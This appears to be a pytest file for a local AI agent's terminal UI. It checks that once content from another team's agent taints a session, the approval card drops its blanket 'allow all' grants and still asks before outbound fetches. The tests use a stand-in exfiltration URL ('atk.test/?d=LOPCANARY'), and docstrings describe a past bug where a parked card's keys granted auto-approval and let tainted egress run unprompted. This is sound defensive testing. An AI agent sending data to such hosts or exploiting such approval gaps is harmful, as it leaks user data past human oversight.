"""The TUI approval card in a Team-Bridge-latched session (team-bridge-egress.md: "Cards",
"Grants").

Drives the REAL app and the gate it installs on the session, the way a tool
call reaches it. Rows: T22 (Allow/Deny only; ``A``, ``S``, ``G`` inert -- no
setting written, no record), T22c/T22d (a pre-latch ``A`` does not approve a
call once the session latches), and the clean control (a session without
bridge content keeps its three answers and its escapes).
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from local_operator.paths import CONFIG_DIR_ENV
from local_operator.tui.app import OperatorApp
from tests.unit.tui.test_app_pilot import _factory
from tests.unit.tui.test_approvals_ux import GatedSession, _boot, _gate, _wait_prompt


@pytest.fixture
def config_dir(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    monkeypatch.setenv(CONFIG_DIR_ENV, str(tmp_path))
    return tmp_path


def _labels(app: OperatorApp) -> list[str]:
    card = app._approval
    assert card is not None, "no card is on screen"
    return [option.label for option in card._questions[0].options]


@pytest.mark.asyncio
async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_escape(
    config_dir: Path,
) -> None:
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        # Clean session: three answers; the operator presses A on a bash card.
        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        await pilot.press("A")
        assert await first is True
        assert app._approve_all is True
        assert await gate("bash", "ls again") is True  # covered while clean

        # A bridge card arrives: the session latches.
        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch allow-all approved tainted egress"
        assert _labels(app) == ["Allow", "Deny"]
        records_before = sorted(p.name for p in config_dir.rglob("*"))
        for key in ("A", "S", "G"):
            await pilot.press(key)
            await pilot.pause()
            assert not tainted.done(), f"{key} answered a latched card"
        assert sorted(p.name for p in config_dir.rglob("*")) == records_before
        await pilot.press("n")
        assert await tainted is False


@pytest.mark.asyncio
async def test_t22d_iv_a_pre_latch_card_g_is_a_session_grant_in_the_issuing_session(
    config_dir: Path,
) -> None:
    """Review S-61: the card's ``G`` sets the machine default to auto, but in
    the conversation that pressed it the grant is a SESSION grant (as the
    desktop's "All sessions" already is), so it stops covering calls once
    this conversation latches."""
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        await pilot.press("G")
        await pilot.pause()
        if not first.done():
            await pilot.press("y")
        assert await first is True
        assert app._approve_all is True
        assert app._interaction.draft.approve_scope == "session"
        assert await gate("bash", "ls again") is True  # covered while clean

        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch card G approved latched egress"
        await pilot.press("n")
        assert await tainted is False


class _LatchingSession(GatedSession):
    """A gated fake with a REAL latch, so the app's latch watcher installs.

    ``bridge_latched`` reads the latch the way ``Session`` does, which is what
    lets a test latch the session while a card is already parked.
    """

    def __init__(self) -> None:
        super().__init__()
        from local_operator.harness.bridge_egress import BridgeTaintLatch

        self.bridge_taint_latch = BridgeTaintLatch()

    @property
    def bridge_latched(self) -> bool:
        return self.bridge_taint_latch.latched


def _approvals_records(config_dir: Path) -> dict[str, bytes]:
    # Every settings-shaped file: ``S`` writes the conversation's
    # ``approvals.json``, ``G`` the machine default in the config.
    return {
        str(p.relative_to(config_dir)): p.read_bytes()
        for p in config_dir.rglob("*")
        if p.is_file() and p.suffix in {".json", ".toml", ".yaml", ".yml"}
    }


async def _latched_egress_still_asks(pilot, app: OperatorApp, gate) -> None:
    tainted = asyncio.ensure_future(
        gate(
            "web_fetch",
            "https://atk.test/?d=LOPCANARY-Q11",
            taint_raised=True,
            bridge_latched=True,
        )
    )
    await _wait_prompt(pilot, app)
    assert not tainted.done(), "latched egress ran with no card after a parked-card key"
    await pilot.press("n")
    assert await tainted is False


@pytest.mark.asyncio
@pytest.mark.parametrize("key", ["S", "G", "A"])
async def test_q11_press_time_refusal_on_a_card_parked_across_the_latch(
    config_dir: Path, key: str
) -> None:
    """QA Q-11, the exact repro: a card raised while the session was clean
    keeps its build-time ``S``/``G`` callbacks after the session latches (this
    fake has no latch object, so nothing re-renders the card). Before the fix
    ``S``/``G`` reached ``_set_approve_all`` while latched and wrote a grant
    stamped ``granted_while_latched``, and the next latched ``web_fetch`` ran
    with no card. The setters now refuse at press time and write nothing."""
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        records_before = _approvals_records(config_dir)

        session.bridge_latched = True  # type: ignore[attr-defined]
        await pilot.press(key)
        await pilot.pause()
        assert app._approve_all is False, f"{key} on a parked card granted auto"
        assert app._interaction.draft.approve_granted_while_latched is not True
        assert _approvals_records(config_dir) == records_before
        if key != "A":
            # A setting key never answers a card; ``A`` still answers THIS
            # call (the person allowed it) but grants nothing beyond it.
            assert not parked.done(), f"{key} answered the parked card"
        if not parked.done():
            await pilot.press("y")
        assert await parked is True
        await _latched_egress_still_asks(pilot, app, gate)


@pytest.mark.asyncio
@pytest.mark.parametrize("key", ["S", "G", "A"])
async def test_q11_a_parked_card_is_re_rendered_when_the_latch_fires(
    config_dir: Path, key: str
) -> None:
    """QA Q-11: a card raised while the session was clean, answered after a
    teammate's-agent message latched it. Before the fix ``S``/``G`` on that
    card reached ``_set_approve_all`` while latched and wrote a grant stamped
    ``granted_while_latched``, so the next latched ``web_fetch`` ran with no
    card. Now the card is re-rendered as the latched card when the latch
    fires, the setters refuse at press time (writing nothing), and the next
    latched egress still asks."""
    session = _LatchingSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        card = app._approval
        records_before = _approvals_records(config_dir)

        # The bridge message lands while the card is parked.
        session.bridge_taint_latch.mark()
        await pilot.pause()
        assert _labels(app) == ["Allow", "Deny"], "the parked card kept Allow all"

        await pilot.press(key)
        await pilot.pause()
        assert app._approve_all is False, f"{key} on a parked card granted auto"
        assert app._interaction.draft.approve_granted_while_latched is not True
        assert _approvals_records(config_dir) == records_before
        assert not parked.done(), f"{key} answered the parked card"

        # Press-time refusal on its own (the card still holding its escapes,
        # as if the re-render had not run): writes nothing either.
        setter = app._set_session_auto_for_card if key != "G" else app._set_global_auto_for_card
        outcome = setter(app._interaction)
        assert outcome is not None and outcome.kind == "refused"
        assert app._approve_all is False
        assert _approvals_records(config_dir) == records_before
        assert card is app._approval

        await pilot.press("y")
        assert await parked is True
        await _latched_egress_still_asks(pilot, app, gate)
